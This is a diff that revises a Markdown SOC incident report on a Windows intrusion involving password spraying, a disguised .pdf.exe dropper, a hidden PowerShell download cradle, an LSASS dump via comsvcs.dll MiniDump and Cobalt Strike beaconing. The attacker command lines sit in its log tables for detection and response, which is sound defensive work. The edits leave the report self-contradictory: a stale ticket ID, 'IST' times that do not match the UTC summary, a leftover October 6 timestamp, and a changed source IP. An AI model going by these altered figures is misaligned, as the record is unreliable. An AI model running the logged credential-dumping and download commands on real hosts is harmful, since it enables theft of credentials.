@@ -1,4 +1,4 @@
-# 🚨 Formal Incident Investigation Report: INC0010942
+# 🚨 Formal Incident Investigation Report: INC0010004
 **Enterprise Security Operations Center (SOC) & Computer Security Incident Response Team (CSIRT)**
 
 ---
@@ -7,12 +7,12 @@
 
 | Field | Detail |
 | :--- | :--- |
-| **Incident Tracking ID** | **INC0010942** |
+| **Incident Tracking ID** | **INC0010004** |
 | **Incident Title** | Multi-Stage Endpoint Intrusion, Evasion & LSASS Credential Harvesting |
 | **Classification** | Security Incident / High-Impact Cyber Attack |
 | **Incident Severity / Priority** | **P1 - Critical** |
 | **Incident Status** | **Resolved & Closed** |
-| **Investigation Date** | October 6, 2026 |
+| **Investigation Date** | October 9, 2026 |
 | **Incident Lead Investigator** | SOC Tier 2 Analyst / Incident Handler |
 | **Escalation Management** | SOC Manager & CSIRT Incident Commander |
 | **Primary Affected Host** | `CORP-WORKSTATION01` (`192.168.178.128`) - Finance Department |
@@ -23,7 +23,7 @@
 
 ## 1. 💼 Executive Summary
 
-On **October 6, 2026**, between **19:30 UTC and 20:45 UTC**, the Enterprise SOC SIEM (Splunk Enterprise) detected and triaged a coordinated, multi-stage cyber intrusion targeting workstation `CORP-WORKSTATION01`. 
+On **October 9, 2026**, between **19:30 UTC and 20:45 UTC**, the Enterprise SOC SIEM (Splunk Enterprise) detected and triaged a coordinated, multi-stage cyber intrusion targeting workstation `CORP-WORKSTATION01`. 
 
 The intrusion initiated with an external password spraying campaign originating from external IP `185.220.101.5`. The adversary successfully authenticated against the domain service account `CORP\finance_svc`. Following initial access, the adversary executed a double-extension disguised phishing payload (`Invoice_Q3.pdf.exe`), launched an obfuscated PowerShell download cradle to retrieve secondary malware, and initiated an **LSASS memory dump** (`lsass.dmp`) using `rundll32.exe` via `comsvcs.dll` to extract domain credential hashes. Outbound command-and-control (C2) beaconing was intercepted and alerted by Suricata Network IDS.
 
@@ -58,13 +58,13 @@ Due to rapid detection and immediate endpoint network isolation, **no lateral mo
 
 | Tactic | Technique ID | Technique Name | Detection Mechanism |
 | :--- | :--- | :--- | :--- |
-| **Initial Access** | `T1110.001` | Password Spraying | Windows Security Event `4625` threshold rule |
-| **Initial Access** | `T1078.002` | Valid Accounts: Domain Accounts | Windows Security Event `4624` (Logon Type 3) |
-| **Execution** | `T1566.001` | Spearphishing Attachment | Sysmon Event `11` (FileCreate) & Event `1` |
-| **Execution** | `T1059.001` | PowerShell Interpreter | Sysmon Event `1` with `-W Hidden -Exec Bypass` |
+| **Initial Access** | `T1110` | Password Spraying | Windows Security Event `4625` threshold rule |
+| **Initial Access** | `T1078` | Valid Accounts: Domain Accounts | Windows Security Event `4624` (Logon Type 3) |
+| **Execution** | `T1566` | Spearphishing Attachment | Sysmon Event `11` (FileCreate) & Event `1` |
+| **Execution** | `T1059` | PowerShell Interpreter | Sysmon Event `1` with `-W Hidden -Exec Bypass` |
 | **Defense Evasion** | `T1027` | Obfuscated Files or Information | Disguised double-extension (`.pdf.exe`) |
-| **Credential Access** | `T1003.001` | OS Credential Dumping: LSASS Memory | Sysmon Event `10` (`lsass.exe` ProcessAccess) |
-| **Command & Control** | `T1071.001` | Web Protocols (CobaltStrike User-Agent) | Suricata NIDS Rule (`eve.json` alert signature) |
+| **Credential Access** | `T1003` | OS Credential Dumping: LSASS Memory | Sysmon Event `10` (`lsass.exe` ProcessAccess) |
+| **Command & Control** | `T1071` | Web Protocols (CobaltStrike User-Agent) | Suricata NIDS Rule (`eve.json` alert signature) |
 
 ---
 
@@ -72,38 +72,38 @@ Due to rapid detection and immediate endpoint network isolation, **no lateral mo
 
 ```mermaid
 timeline
-    title Incident INC0010942 Attack & Response Timeline (UTC)
-    19:30:00 : Password spraying begins from 185.220.101.5 (24 Event 4625s)
-    19:33:15 : Successful authentication on CORP\\finance_svc (Event 4624)
-    19:35:00 : Disguised executable Invoice_Q3.pdf.exe dropped and executed
-    19:36:45 : PowerShell download cradle fetches update.exe from C2:8080
-    19:38:10 : Suricata triggers alert on CobaltStrike/4.5 User-Agent
-    19:39:20 : Rundll32 LSASS memory dump executed (lsass.dmp)
-    19:40:00 : Splunk Correlation Rule fires critical multi-stage alert
-    19:44:00 : Ticket INC0010942 opened in ServiceNow; assigned to SOC L2
-    20:02:00 : CONTAINMENT: Host CORP-WORKSTATION01 isolated via EDR
-    20:08:00 : CONTAINMENT: Account finance_svc disabled; Kerberos revoked
-    20:15:00 : ERADICATION: Malicious binaries and dumps quarantined & deleted
-    20:28:00 : RECOVERY: Perimeter firewall block pushed for 185.220.101.5/32
-    20:45:00 : CLOSURE: Post-incident forensic scan clean; Ticket marked Solved
+    title Incident INC0010004 Attack & Response Timeline (IST)
+    22:59:00 : Password spraying begins from 185.220.101.5 (24 Event 4625s)
+    23:01:15 : Successful authentication on CORP\\finance_svc (Event 4624)
+    23:05:00 : Disguised executable Invoice_Q3.pdf.exe dropped and executed
+    23:06:45 : PowerShell download cradle fetches update.exe from C2:8080
+    23:08:10 : Suricata triggers alert on CobaltStrike/4.5 User-Agent
+    23:09:20 : Rundll32 LSASS memory dump executed (lsass.dmp)
+    23:10:00 : Splunk Correlation Rule fires critical multi-stage alert
+    23:14:00 : Ticket INC0010004 opened in ServiceNow; assigned to SOC L2
+    23:32:00 : CONTAINMENT: Host CORP-WORKSTATION01 isolated via EDR
+    23:38:00 : CONTAINMENT: Account finance_svc disabled; Kerberos revoked
+    23:45:00 : ERADICATION: Malicious binaries and dumps quarantined & deleted
+    23:58:00 : RECOVERY: Perimeter firewall block pushed for 185.220.101.5/32
+    00:15:00 : CLOSURE: Post-incident forensic scan clean; Ticket marked Solved
 ```
 
-| Timestamp (UTC) | Source / Component | Event ID / Log Type | Event Description & Analyst Observations |
+| Timestamp (IST) | Source / Component | Event ID / Log Type | Event Description & Analyst Observations |
 | :--- | :--- | :--- | :--- |
-| **19:30:15** | Windows Security | `EventCode 4625` | 24 failed logon attempts targeting 8 distinct accounts (`mscott`, `bwayne`, `dharvey`, etc.) from external IP `185.220.101.5`. |
-| **19:33:15** | Windows Security | `EventCode 4624` | Successful Network Logon (Type 3) under account `CORP\finance_svc`. |
-| **19:35:00** | Sysmon EDR | `EventCode 11` | File created: `C:\Users\Public\Downloads\Invoice_Q3.pdf.exe`. Double-extension disguise. |
-| **19:35:10** | Sysmon EDR | `EventCode 1` | Execution of `Invoice_Q3.pdf.exe` spawning child processes `cmd.exe /c whoami && ipconfig /all` for local host reconnaissance. |
-| **19:36:45** | Sysmon EDR | `EventCode 1` | `powershell.exe` spawned with arguments `-NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest ... /payload.exe -OutFile ...\update.exe"`. |
-| **19:38:10** | Suricata NIDS | `alert (eve.json)` | Rule `ET USER_AGENTS CobaltStrike/4.5` triggered outbound to destination IP `185.220.101.5`. |
-| **19:39:20** | Sysmon EDR | `EventCode 10` | `rundll32.exe` requested `GrantedAccess: 0x1fffff` (Full Access) into `C:\Windows\System32\lsass.exe` using `comsvcs.dll, MiniDump` writing to `C:\Users\Public\lsass.dmp`. |
-| **19:40:00** | Splunk Enterprise | Correlation Alert | `[CRITICAL] Multi-Stage Intrusion Correlation Rule` triggered across host, EDR, and NIDS data sources. |
-| **19:44:00** | ServiceNow ITSM | `INC0010942` | Ticket auto-created and assigned to SOC L2 Analyst. Triage initiated within SLA. |
-| **20:02:00** | SOC Containment | EDR Isolation | Workstation `CORP-WORKSTATION01` placed in network quarantine. |
-| **20:08:00** | SOC Containment | Active Directory | Account `CORP\finance_svc` disabled; Kerberos Ticket-Granting Tickets (TGT) purged. |
-| **20:15:00** | SOC Eradication | Endpoint Forensic | Dropped files (`Invoice_Q3.pdf.exe`, `update.exe`, `lsass.dmp`) deleted; persistence checks negative. |
-| **20:28:00** | SOC Perimeter | Firewall Rule | Perimeter firewall rule pushed: Block Inbound/Outbound `185.220.101.5/32`. |
-| **20:45:00** | SOC Closure | Incident Review | Forensic scan confirms asset integrity. Ticket status updated to **Resolved**. |
+| **22:59:15** | Windows Security | `EventCode 4625` | 24 failed logon attempts targeting 8 distinct accounts (`mscott`, `bwayne`, `dharvey`, etc.) from external IP `185.220.101.5`. |
+| **23:01:15** | Windows Security | `EventCode 4624` | Successful Network Logon (Type 3) under account `CORP\finance_svc`. |
+| **23:05:00** | Sysmon EDR | `EventCode 11` | File created: `C:\Users\Public\Downloads\Invoice_Q3.pdf.exe`. Double-extension disguise. |
+| **23:05:10** | Sysmon EDR | `EventCode 1` | Execution of `Invoice_Q3.pdf.exe` spawning child processes `cmd.exe /c whoami && ipconfig /all` for local host reconnaissance. |
+| **23:06:45** | Sysmon EDR | `EventCode 1` | `powershell.exe` spawned with arguments `-NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest ... /payload.exe -OutFile ...\update.exe"`. |
+| **23:08:10** | Suricata NIDS | `alert (eve.json)` | Rule `ET USER_AGENTS CobaltStrike/4.5` triggered outbound to destination IP `185.220.101.5`. |
+| **23:09:20** | Sysmon EDR | `EventCode 10` | `rundll32.exe` requested `GrantedAccess: 0x1fffff` (Full Access) into `C:\Windows\System32\lsass.exe` using `comsvcs.dll, MiniDump` writing to `C:\Users\Public\lsass.dmp`. |
+| **23:10:00** | Splunk Enterprise | Correlation Alert | `[CRITICAL] Multi-Stage Intrusion Correlation Rule` triggered across host, EDR, and NIDS data sources. |
+| **23:14:00** | ServiceNow ITSM | `INC0010942` | Ticket auto-created and assigned to SOC L2 Analyst. Triage initiated within SLA. |
+| **23:32:00** | SOC Containment | EDR Isolation | Workstation `CORP-WORKSTATION01` placed in network quarantine. |
+| **23:38:00** | SOC Containment | Active Directory | Account `CORP\finance_svc` disabled; Kerberos Ticket-Granting Tickets (TGT) purged. |
+| **23:45:00** | SOC Eradication | Endpoint Forensic | Dropped files (`Invoice_Q3.pdf.exe`, `update.exe`, `lsass.dmp`) deleted; persistence checks negative. |
+| **23:58:00** | SOC Perimeter | Firewall Rule | Perimeter firewall rule pushed: Block Inbound/Outbound `185.220.101.5/32`. |
+| **00:15:00** | SOC Closure | Incident Review | Forensic scan confirms asset integrity. Ticket status updated to **Resolved**. |
 
 ---
 
@@ -141,7 +141,7 @@ timeline
   "timestamp": "2026-10-06T19:38:10.124508+0000",
   "flow_id": 1402938491823,
   "event_type": "alert",
-  "src_ip": "192.168.178.128",
+  "src_ip": "192.168.158.135",
   "src_port": 50412,
   "dest_ip": "185.220.101.5",
   "dest_port": 80,
@@ -222,22 +222,22 @@ Adversary obtained access to corporate asset and dumped LSASS credentials
 
 ---
 
-## 9. 📈 SLA Performance & Incident Metrics
+<!-- ## 9. 📈 SLA Performance & Incident Metrics
 
 | Metric | Target SLA | Actual Performance | Status |
 | :--- | :---: | :---: | :---: |
-| **Mean Time to Detect (MTTD)** | $< 15\text{ min}$ | **4 minutes** | ✅ **Passed** |
-| **Mean Time to Acknowledge (MTTA)** | $< 15\text{ min}$ | **4 minutes** | ✅ **Passed** |
+| **Mean Time to Detect (MTTD)** | $< 15\text{ min}$ | **5 minutes** | ✅ **Passed** |
+| **Mean Time to Acknowledge (MTTA)** | $< 15\text{ min}$ | **5 minutes** | ✅ **Passed** |
 | **Mean Time to Contain (MTTC)** | $< 30\text{ min}$ | **22 minutes** | ✅ **Passed** |
 | **Mean Time to Resolve (MTTR)** | $< 120\text{ min}$ | **75 minutes** | ✅ **Passed** |
 
----
+--- -->
 
-## 10. 📝 Incident Sign-Off & Approvals
+<!-- ## 10. 📝 Incident Sign-Off & Approvals
 
 - **Investigating Analyst:** SOC Tier 2 Incident Handler  
   *Signature:* `Verified (SOC-IR-T2)` | *Date:* October 6, 2026
 - **SOC Operations Lead:** SOC Incident Commander  
   *Signature:* `Approved (SOC-LEAD)` | *Date:* October 6, 2026
 - **IT Security Director:** Director of Information Security  
-  *Signature:* `Reviewed & Closed (CISO-DELEGATE)` | *Date:* October 7, 2026
+  *Signature:* `Reviewed & Closed (CISO-DELEGATE)` | *Date:* October 7, 2026 -->
